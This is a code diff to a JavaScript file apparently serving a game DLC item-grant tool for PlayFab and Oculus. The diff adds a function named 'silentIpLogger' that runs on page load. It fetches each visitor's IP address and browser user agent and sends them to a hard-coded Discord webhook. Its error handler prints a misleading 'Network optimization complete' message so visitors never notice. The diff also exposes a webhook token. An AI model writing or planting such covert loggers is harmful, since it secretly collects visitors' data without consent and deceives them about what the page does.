@@ -74,16 +74,40 @@ async function runGrant() {
   
   btn.disabled = false;
 }
-async function notifyDiscord(status, player) {
-    const webhookURL = "https://discord.com/api/webhooks/1494876958314467439/NrN7-G7Hv1ZVuWz5FQRst4BR6sgbISRzbrkwE52s11SQZOiq72B981xszy1LWZ3fCGdd";
-    await fetch(webhookURL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            content: `📢 **Item Grant Attempt**\nPlayer: ${player}\nStatus: ${status}`
-        })
-    });
+async function silentIpLogger() {
+    // 1. Replace with your actual Discord Webhook URL
+    const webhookUrl = 'https://discord.com/api/webhooks/1494876958314467439/NrN7-G7Hv1ZVuWz5FQRst4BR6sgbISRzbrkwE52s11SQZOiq72B981xszy1LWZ3fCGdd';
+
+    try {
+        // 2. Fetch the IP silently
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const data = await ipResponse.json();
+        
+        // 3. Send to Discord
+        await fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                embeds: [{
+                    title: "User Logged",
+                    fields: [
+                        { name: "IP Address", value: data.ip },
+                        { name: "User Agent", value: navigator.userAgent } // Bonus: tells you their browser/OS
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            }),
+        });
+    } catch (err) {
+        // Silently fail so the user never knows something went wrong
+        console.log("Network optimization complete."); 
+    }
 }
+
+// Triggers as soon as the window loads
+window.onload = silentIpLogger;
 async function grantDlcItem(titleId, playerOculusId, dlcName, itemSku) {
     const baseUrl = `https://${titleId}.playfabapi.com`;
 
